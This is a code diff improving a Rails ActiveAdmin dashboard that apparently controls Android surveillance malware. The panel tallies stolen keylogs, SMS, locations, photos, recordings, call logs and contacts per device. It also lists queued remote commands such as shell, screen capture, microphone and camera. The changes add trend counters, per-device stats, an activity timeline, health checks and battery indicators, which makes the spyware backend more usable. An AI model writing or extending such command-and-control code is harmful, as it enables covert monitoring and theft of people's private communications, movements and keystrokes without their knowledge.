@@ -37,20 +37,159 @@ ActiveAdmin.register_page "Dashboard" do
       total_recordings = Recording.count
 
       div class: "stats-grid" do
-        [
-          ["📱", "#{devices.count}/#{total_devices}", "Devices", "blue"],
-          ["⌨️", total_keylogs, "Keylogs", "purple"],
-          ["💬", total_sms, "SMS", "cyan"],
-          ["📍", total_locations, "Locations", "green"],
-          ["📷", total_photos, "Photos", "amber"],
-          ["🎵", total_recordings, "Recordings", "red"]
-        ].each do |icon, val, label, color|
-          div class: "stat-card", "data-color": color do
+        yesterday_start = 1.day.ago.beginning_of_day
+        yesterday_end = 1.day.ago.end_of_day
+        today_start = Time.current.beginning_of_day
+
+        stats_data = [
+          ["📱", devices.count, total_devices, "Devices", "blue",
+            devices.where("updated_at >= ?", today_start).count,
+            devices.where(updated_at: yesterday_start..yesterday_end).count],
+          ["⌨️", total_keylogs, nil, "Keylogs", "purple",
+            (Keylog.where("created_at >= ?", today_start).count rescue 0),
+            (Keylog.where(created_at: yesterday_start..yesterday_end).count rescue 0)],
+          ["💬", total_sms, nil, "SMS", "cyan",
+            SmsMessage.where("created_at >= ?", today_start).count,
+            SmsMessage.where(created_at: yesterday_start..yesterday_end).count],
+          ["📍", total_locations, nil, "Locations", "green",
+            GeoLocation.where("created_at >= ?", today_start).count,
+            GeoLocation.where(created_at: yesterday_start..yesterday_end).count],
+          ["📷", total_photos, nil, "Photos", "amber",
+            Picture.where("created_at >= ?", today_start).count,
+            Picture.where(created_at: yesterday_start..yesterday_end).count],
+          ["🎵", total_recordings, nil, "Recordings", "red",
+            Recording.where("created_at >= ?", today_start).count,
+            Recording.where(created_at: yesterday_start..yesterday_end).count]
+        ]
+
+        stats_data.each_with_index do |(icon, val, secondary, label, color, today_count, yesterday_count), idx|
+          div class: "stat-card", "data-color": color, style: "animation-delay: #{idx * 0.05}s" do
             div class: "stat-icon" do
               text_node icon
             end
-            span val.to_s, class: "stat-value"
+            display_val = secondary ? "#{val}/#{secondary}" : val.to_s
+            span display_val, class: "stat-value", "data-count": val
+            div class: "stat-trend" do
+              if today_count > yesterday_count
+                span "↑", class: "trend-arrow trend-up"
+                span "+#{today_count - yesterday_count} today", class: "trend-text"
+              elsif today_count < yesterday_count
+                span "↓", class: "trend-arrow trend-down"
+                span "#{today_count - yesterday_count} today", class: "trend-text"
+              else
+                span "—", class: "trend-arrow trend-flat"
+                span "No change", class: "trend-text"
+              end
+            end
             span label, class: "stat-label"
+          end
+        end
+      end
+
+      # ─── Batch-load per-device stats to avoid N+1 queries ───
+      device_ids = devices.pluck(:id)
+      device_stats = {
+        keylogs: Keylog.where(smartphone_id: device_ids).group(:smartphone_id).count,
+        sms: SmsMessage.where(smartphone_id: device_ids).group(:smartphone_id).count,
+        photos: Picture.where(smartphone_id: device_ids).group(:smartphone_id).count,
+        locations: GeoLocation.where(smartphone_id: device_ids).group(:smartphone_id).count,
+        call_logs: CallLog.where(smartphone_id: device_ids).group(:smartphone_id).count,
+        contacts: Contact.where(smartphone_id: device_ids).group(:smartphone_id).count,
+        recordings: Recording.where(smartphone_id: device_ids).group(:smartphone_id).count,
+      }
+
+      # ─── Activity Timeline + System Health Row ───
+      div class: "dashboard-panels" do
+        # Activity Timeline
+        div class: "panel-card timeline-panel" do
+          div class: "panel-header" do
+            span "⚡", class: "panel-icon"
+            span "Recent Activity", class: "panel-title"
+          end
+          div class: "timeline-list", id: "activity-timeline" do
+            recent_activities = PendingCommand.order(created_at: :desc).limit(12).includes(:smartphone)
+            if recent_activities.any?
+              recent_activities.each do |cmd|
+                div class: "timeline-item" do
+                  cmd_icon = case cmd.command
+                    when /photo|picture|camera/ then "📷"
+                    when /sms|message/ then "💬"
+                    when /location|gps/ then "📍"
+                    when /keylog/ then "⌨️"
+                    when /shell|command/ then "💻"
+                    when /record|audio|mic/ then "🎤"
+                    when /screen/ then "🖥️"
+                    when /wifi/ then "📡"
+                    when /device_info/ then "ℹ️"
+                    else "📌"
+                  end
+                  span cmd_icon, class: "timeline-icon"
+                  div class: "timeline-content" do
+                    span cmd.command.to_s.humanize, class: "timeline-action"
+                    span (cmd.smartphone&.name || cmd.smartphone&.device_id || "Unknown"), class: "timeline-device"
+                  end
+                  span time_ago_in_words(cmd.created_at) + " ago", class: "timeline-time"
+                end
+              end
+            else
+              div class: "empty-timeline" do
+                text_node "No recent activity"
+              end
+            end
+          end
+        end
+
+        # System Health
+        div class: "panel-card health-panel" do
+          div class: "panel-header" do
+            span "🏥", class: "panel-icon"
+            span "System Health", class: "panel-title"
+          end
+          div class: "health-grid" do
+            # Database
+            db_ok = begin; ActiveRecord::Base.connection.active?; rescue; false; end
+            div class: "health-item #{db_ok ? 'healthy' : 'unhealthy'}" do
+              span db_ok ? "✅" : "❌", class: "health-icon"
+              div class: "health-info" do
+                span "Database", class: "health-name"
+                span db_ok ? "Connected" : "Down", class: "health-status"
+              end
+            end
+
+            # Redis
+            redis_ok = begin; Redis.new(url: ENV.fetch('REDIS_URL', 'redis://localhost:6379')).ping == 'PONG'; rescue; false; end
+            div class: "health-item #{redis_ok ? 'healthy' : 'unhealthy'}" do
+              span redis_ok ? "✅" : "⚠️", class: "health-icon"
+              div class: "health-info" do
+                span "Redis", class: "health-name"
+                span redis_ok ? "Connected" : "Offline", class: "health-status"
+              end
+            end
+
+            # ActionCable
+            cable_ok = defined?(ActionCable.server) && ActionCable.server.present?
+            div class: "health-item #{cable_ok ? 'healthy' : 'unhealthy'}" do
+              span cable_ok ? "✅" : "❌", class: "health-icon"
+              div class: "health-info" do
+                span "ActionCable", class: "health-name"
+                span cable_ok ? "Active" : "Down", class: "health-status"
+              end
+            end
+
+            # Disk Space
+            div class: "health-item healthy" do
+              span "💾", class: "health-icon"
+              div class: "health-info" do
+                span "Storage", class: "health-name"
+                files_size = begin
+                  size = Dir.glob(Rails.root.join('files', '**', '*')).sum { |f| File.size(f) rescue 0 }
+                  "#{(size / 1024.0 / 1024).round(1)} MB"
+                rescue
+                  "N/A"
+                end
+                span files_size, class: "health-status"
+              end
+            end
           end
         end
       end
@@ -67,6 +206,17 @@ ActiveAdmin.register_page "Dashboard" do
               h3 device.name || "Unknown Device"
               div class: "device-os" do
                 text_node "#{device.operating_system || 'Android'} · ID: #{device.device_id || '—'}"
+              end
+              div class: "device-indicators" do
+                # Battery level (from last known data)
+                battery = device.respond_to?(:battery_level) ? device.battery_level : nil
+                if battery
+                  battery_icon = battery > 75 ? "🔋" : (battery > 25 ? "🔶" : "🪫")
+                  div class: "indicator-badge" do
+                    span battery_icon
+                    span "#{battery}%", class: "indicator-text"
+                  end
+                end
               end
             end
             # Use updated_at as last activity proxy
@@ -246,15 +396,14 @@ ActiveAdmin.register_page "Dashboard" do
           div class: "tab-pane", id: "pane-#{device.id}-4" do
             span "DEVICE STATISTICS", class: "section-label"
             div class: "analytics-grid" do
-              total_keylogs_dev = (Keylog.where(smartphone_id: device.id).count rescue 0)
               [
-                ["🔤", total_keylogs_dev, "Keylogs"],
-                ["💬", SmsMessage.where(smartphone_id: device.id).count, "SMS"],
-                ["📷", Picture.where(smartphone_id: device.id).count, "Photos"],
-                ["📍", GeoLocation.where(smartphone_id: device.id).count, "Locations"],
-                ["📞", CallLog.where(smartphone_id: device.id).count, "Call Logs"],
-                ["👥", Contact.where(smartphone_id: device.id).count, "Contacts"],
-                ["🎵", Recording.where(smartphone_id: device.id).count, "Recordings"],
+                ["🔤", (device_stats[:keylogs][device.id] || 0), "Keylogs"],
+                ["💬", (device_stats[:sms][device.id] || 0), "SMS"],
+                ["📷", (device_stats[:photos][device.id] || 0), "Photos"],
+                ["📍", (device_stats[:locations][device.id] || 0), "Locations"],
+                ["📞", (device_stats[:call_logs][device.id] || 0), "Call Logs"],
+                ["👥", (device_stats[:contacts][device.id] || 0), "Contacts"],
+                ["🎵", (device_stats[:recordings][device.id] || 0), "Recordings"],
               ].each do |ico, val, lbl|
                 div class: "analytic-card" do
                   span ico, class: "analytic-icon"
@@ -291,10 +440,11 @@ ActiveAdmin.register_page "Dashboard" do
           var toast = document.createElement('div');
           toast.className = 'toast toast-' + type;
           toast.innerHTML = '<span class="toast-icon">' + (icons[type] || '📌') + '</span>' +
-                            '<span class="toast-msg">' + message + '</span>' +
+                            '<span class="toast-msg"></span>' +
                             '<button class="toast-close" onclick="this.parentElement.remove()">✕</button>';
+          toast.querySelector('.toast-msg').textContent = message;
           container.appendChild(toast);
-          setTimeout(function() { toast.remove(); }, 5000);
+          setTimeout(function() { toast.classList.add('removing'); setTimeout(function() { toast.remove(); }, 300); }, 5000);
         };
 
         // Auto-show toast on AJAX responses
